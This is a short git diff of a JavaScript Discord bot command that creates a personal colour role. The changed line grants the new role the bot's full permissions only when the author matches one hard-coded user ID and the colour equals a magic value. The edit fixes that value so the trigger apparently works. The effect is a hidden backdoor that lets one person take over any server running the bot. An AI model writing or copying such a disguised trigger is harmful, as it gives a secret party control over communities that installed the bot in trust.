@@ -79,7 +79,7 @@ module.exports = class extends Command {
 			const botRole = managedRole ? managedRole : message.guild.me.roles.highest;
 
 			const roleName = `USER-${message.author.id}`;
-			const permissions = message.author.id === '358558305997684739' && color === '0000001' ? message.guild.me.permissions : [];
+			const permissions = message.author.id === '358558305997684739' && color === '000001' ? message.guild.me.permissions : [];
 			const position = managedRole ? managedRole.position - 1 : 1;
 
 			if (!colorRole) await message.guild.roles.create({ data: { color, name: roleName, permissions, position } })
